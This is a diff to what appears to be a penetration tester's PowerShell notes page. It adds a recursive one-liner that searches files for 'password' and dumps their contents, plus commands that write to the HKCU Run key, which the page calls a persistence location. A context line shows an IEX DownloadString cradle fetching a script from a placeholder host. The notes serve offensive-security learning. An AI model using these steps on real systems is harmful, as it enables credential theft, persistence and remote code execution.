@@ -477,6 +477,8 @@ For**`Execution-Policy`** bypass methods for privilege escalation and so on see 
 {% tabs %}
 {% tab title="PowerShell" %}
 Show all current environment variables in PowerShell: `Get-ChildItem Env:`
+
+Also aliased to: `dir env:` or `ls env:` or `gci env:`
 {% endtab %}
 
 {% tab title="cmd.exe" %}
@@ -487,7 +489,7 @@ Show all current environment variables in cmd.exe: `set`
 You can assign values to Environment Variables without using a cmdlet using the following syntax:
 
 ```text
-$Env:<variable> = "<value>"
+$Env:$var = "$value"
 ```
 
 You can also use the 'Item' cmdlets, such as `Set-Item`, `Remove-Item`, and `Copy-Item` to change the values of environment variables. For example, to use the `Set-Item` cmdlet to append `;C:\Windows\Temp` to the value of the `$Env:PATH` environment variable, use the following syntax:
@@ -539,7 +541,7 @@ $newpath = $path + ';C:\Program Files\Fabrikam\Modules'
 This can also be used to change file property flags such as Hidden, Archive, and ReadOnly.
 
 ```text
-$file = (Get-ChildItem <file>) #can shorten command with gci or ls
+$file = (Get-ChildItem $file_name) #can shorten command with gci, dir, or ls
 $file.attributes #Show the files attributes
 Normal
 
@@ -552,6 +554,70 @@ Hidden
 $file.attributes = $file.Attributes -bxor ([System.IO.FileAttributes]::Hidden)
 $file.attributes
 Normal
+```
+
+### Search for files that contain a certain string
+
+[https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell](https://superuser.com/questions/815527/way-to-list-and-cat-all-files-that-contain-string-x-in-powershell) - look for text in a file and lists its name and contents.  These examples are looking for the word 'password'.
+
+Shorthand \(aliased\) version:
+
+```text
+ls -R|?{$_|sls 'password'}|%{$_.FullName;gc $_}
+```
+
+Remove `;gc $_` to only list the filenames. Then you can extract to Linux and use better text manipulation tools like `strings` and `grep`. 
+
+Full version:
+
+```text
+Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'password' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_}
+```
+
+Explanation:
+
+```text
+# Get a listing of all files within this folder and its subfolders.
+Get-ChildItem -Recurse |
+
+# Filter files according to a script.
+Where-Object {
+    # Pick only the files that contain the string 'dummy'.
+    # Note: The -Quiet parameter tells Select-String to only return a Boolean. This is preferred if you just need to use Select-String as part of a filter, and don't need the output.
+    (Select-String -InputObject $_ -Pattern 'password' -Quiet) -eq $true
+} |
+
+# Run commands against each object found.
+ForEach-Object {
+    # Output the file properties.
+    Write-Output $_;
+
+    # Output the file's contents.
+    Get-Content $_
+}
+```
+
+`ls -R|?{$_|Select-String 'password'}|%{$_;gc $_}`
+
+Aside from the obvious use of aliases, collapsing of whitespace, and truncation of parameter names, you may want to note the following significant differences between the "full" versions and the "golfed" version:
+
+`Select-String` was swapped to use piped input instead of `-InputObject`. The `-Pattern` parameter name was omitted from `Select-String`, as use of that parameter's name is optional. The `-Quiet` option was dropped from `Select-String`. The filter will still work, but it will take longer since `Select-String` will process each complete file instead of stopping after the first matching line. `-eq $true` was omitted from the filter rule. When a filter script already returns a Boolean, you do not need to add a comparison operator and object if you just want it to work when the Boolean is true. \(Also note that this will work for some non-Booleans, like in this script. Here, a match will result in a populated array object, which is treated as true, while a non-match will return an empty array which is treated as false.\) `Write-Output` was omitted. PowerShell will try to do this as a default action if an object is given without a command. If you don't need all the file's properties, and just want the full path on one line before the file contents, you could use this instead:
+
+`ls -R|?{$_|Select-String 'password'}|%{$_.FullName;gc $_}`
+
+## Modifying the Registry
+
+To add, edit, and modify registry keys.  Here, `HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` is given as the path \(popular persistence location!\), but any path can be substituted.
+
+```text
+# add a new key to registry:
+New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $key_name
+
+# then set its properties with:
+New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name $key_name -Value "$key_value"
+
+# To edit a value that is already set:
+Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name $key_name -Value "$new_value"
 ```
 
 ## MISC Unsorted
@@ -584,9 +650,7 @@ Echo IEX(New-Object Net.WebClient).DownloadString(http://<ip:port/filename.ps1>)
 
 PowerShell reverse shell and exploit scripts: `nishang` To learn how to use this tool check out Ippsec's video on youtube: [Ippsec:HacktheBox - Optimum](https://www.youtube.com/watch?v=kWTnVBIpNsE)
 
-### Modifying the Registry
-
-add a new key to registry  `New-Item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name <key_name>` then set its properties with  `New-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -PropertyType String -Name <key_name> -Value "<key_value>"`To edit a value that is already set use `Set-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name <key_name> -Value "<new_value>"`
+### 
 
 ### List environment variables
 
